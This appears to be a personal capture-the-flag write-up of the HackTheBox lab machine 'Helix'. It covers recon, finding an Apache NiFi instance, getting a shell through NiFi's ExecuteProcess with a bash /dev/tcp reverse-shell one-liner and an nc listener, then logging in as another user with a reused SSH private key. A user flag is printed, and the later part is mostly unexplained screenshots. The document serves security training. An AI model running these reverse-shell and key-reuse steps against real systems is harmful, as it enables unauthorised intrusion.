
# #HTB 


![[Pasted image 20260811232142.png|281]]


# HackTheBox: Helix

**Machine IP:** `10.129.245.123`  
**Difficulty:** Medium  
**OS:** Linux

---

## Tools Used
- `nmap` - Port discovery
- `ffuf` - Subdomain enumeration
- `ssh` - Remote access
- `nc` - Reverse shells
- `python3` - Exploit development & OPC UA interaction
- `asyncio` / `opcua-asyncio` (Python) - Industrial control protocol exploitation

---

## Step 1: Reconnaissance - Port Scanning

### Why We Start with Nmap

The first step in any penetration test is reconnaissance. We need to understand what services are running on the target machine, what ports are open, and what versions of software are being used. This information helps us identify potential vulnerabilities.

### Nmap Command Explained

```bash
nmap -n -Pn -sV -sC 10.129.245.123
```

**Flag Breakdown:**
- `-n`: Skip DNS resolution (faster scanning)
- `-Pn`: Treat host as online (skip ping check)
- `-sV`: Version detection - identifies service versions
- `-sC`: Run default scripts - basic vulnerability checks


![[Pasted image 20260810224115.png]]

### Nmap Results Analysis

**Open ports discovered:**
- **Port 22 (SSH)** - OpenSSH 8.9p1 Ubuntu
    - This is the Secure Shell service for remote administration
    - Version 8.9p1 is relatively standard
- **Port 80 (HTTP)** - Nginx 1.18.0
    - The main web server running
    - The `http-title` script reveals a redirect to `http://helix.htb/`

**Key Discovery:** The hostname `helix.htb` is revealed. We must add this to our hosts file to interact with the web application properly.

### Hosts File Configuration
```bash
echo "10.129.245.123 helix.htb" | sudo tee -a /etc/hosts
```

**Why This Matters:** The web server uses virtual host configuration. If we access the IP directly, the server won't know which website to serve. By adding `helix.htb` to our hosts file, we ensure our browser and tools can resolve the domain correctly.


---

## Step 2: Web Enumeration - Subdomain Discovery

### Website Overview

Visiting `http://helix.htb` reveals a generic placeholder page. We need to enumerate hidden subdomains to find the actual application.

### FFUF - Subdomain Bruteforcing

```bash
ffuf -u http://helix.htb -H "Host: FUZZ.helix.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200
```


![[Pasted image 20260810225313.png]]


**Why This Matters:** The web server is configured with virtual hosts. We need to discover which subdomains are active to find the entry point.

**Discovery:**
- `flow.helix.htb` returns a status code 200!
- This appears to be a different application

**Add the subdomain to hosts:**
```bash
echo "10.129.245.123 flow.helix.htb" | sudo tee -a /etc/hosts
```


---

## Step 3: Identifying Apache NiFi

### Exploring the Subdomain

Visiting `http://flow.helix.htb/nifi` reveals an **Apache NiFi** interface.

**What is Apache NiFi?** Apache NiFi is a widely-used open-source data integration tool that supports highly scalable and flexible dataflows. It features a visual web-based UI for designing data pipelines.

**Version Discovery:** Clicking "About" reveals the exact version.

![[Pasted image 20260810230658.png]]

**Discovered Version:** `1.21.0`

**Why This Matters:** Knowing the exact version allows us to look up specific CVEs (Common Vulnerabilities and Exposures).

### Finding an Exploit

Searching for `apache nifi 1.21.0 vulnerability` reveals critical exploits.

![[Pasted image 20260810230638.png]]

**Key Vulnerability:** **CVE-2023-34468** (Code Injection / RCE)
- This vulnerability affects `DBCPConnectionPool` and `HikariCPConnectionPool` controller services.
- By using an H2 JDBC driver, crafted database connection strings can trigger remote script execution.
- **CVSS Score:** 8.8 (High)

**Why This Version Matters:** Version 1.21.0 is vulnerable to this unauthenticated Remote Code Execution (RCE) chain. This will be our initial entry point.



---

## Step 4: CVE-2023-34468 - Apache NiFi RCE

### Gaining Initial Access

In the NiFi UI, an attacker with access to the UI can add a new Processor or modify an existing one. The critical vulnerability lies in how NiFi handles certain controller services.

However, since we have UI access, the most straightforward way to get a shell is to utilize the **`ExecuteProcess`** processor.
1. Open the NiFi Flow UI at `http://flow.helix.htb/nifi`.
2. Add a new Processor: `ExecuteProcess`.

![[Pasted image 20260811205910.png]]


3. **Configure the Processor:**
    - **Command:** `/bin/bash`
    - **Command Arguments:** `-c bash -i >& /dev/tcp/10.10.14.163/4545 0>&1` (This is a classic one-liner reverse shell)
    - **Argument Delimiter:** `|` (This ensures the command is treated as a single argument)

![[Pasted image 20260811210010.png]]

4. **Start the Listener:**
```bash
nc -lvp 4545
```

5. **Trigger the Processor:** Right-click the processor and select "Start". The process will execute, spawning a reverse shell back to our listener.

![[Pasted image 20260811205926.png]]

**Result (Shell Obtained):**
```bash
nifi@helix:/opt/nifi-1.21.0$ whoami
nifi
```

![[Pasted image 20260811210406.png]]

**What User Are We?** The `nifi` service user. This user has basic permissions and is running inside the `/opt/nifi-1.21.0` directory. We need to escalate privileges further.


---

## Step 5: Lateral Movement - SSH Key Discovery

#### Enumerating the Service Directory

Since we are already in the NiFi installation directory, we should enumerate configuration files and backup folders.

#### Finding an SSH Key
```bash
nifi@helix:/opt/nifi-1.21.0$ ls -la support-bundles/
```

**What is Support-Bundles?** NiFi creates support bundles containing logs, configuration files, and sometimes secure backups for debugging purposes.

**Contents Discovered:**
- `operator_id_ed25519.bak` - A private SSH key file

**What This Matters:** Private SSH keys are extremely valuable. If this key belongs to another user on the system, we can use it to log in as that user.

```bash
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
```


![[Pasted image 20260811215020.png]]


### Reusing the SSH Key

1. **Transfer the key to our machine:**  
    We manually copy the key content into a local file named `sshkey`.
2. **Set the correct permissions:**
```bash
chmod 600 sshkey
```


![[Pasted image 20260811215239.png]]


3. **Attempt SSH login as `operator`:**
```bash
ssh -i sshkey operator@helix.htb
```

**Result:** SUCCESS! We are logged in as the `operator` user.

![[Pasted image 20260811215248.png]]

**User Flag:**
```bash
operator@helix:~$ cat user.txt
62157af723e569735d8f95e71ae5df9a
```

![[Pasted image 20260811215531.png]]



![[Pasted image 20260811221018.png]]


![[Pasted image 20260811220959.png]]

decrypt and open pdf

```bash
└─$ qpdf --password=operator1 --decrypt "Operator Control & Safety Guide.pdf" decrypted.pdf

```

```bash
└─$ xdg-open decrypted.pdf 
```



![[Pasted image 20260811231408.png]]



![[Pasted image 20260811231541.png]]



![[Pasted image 20260811231611.png]]



![[Pasted image 20260811231622.png]]




![[Pasted image 20260811231902.png]]



![[Pasted image 20260811231916.png]]



![[Pasted image 20260811231938.png]]



![[Pasted image 20260811231948.png]]



![[Pasted image 20260811232005.png]]



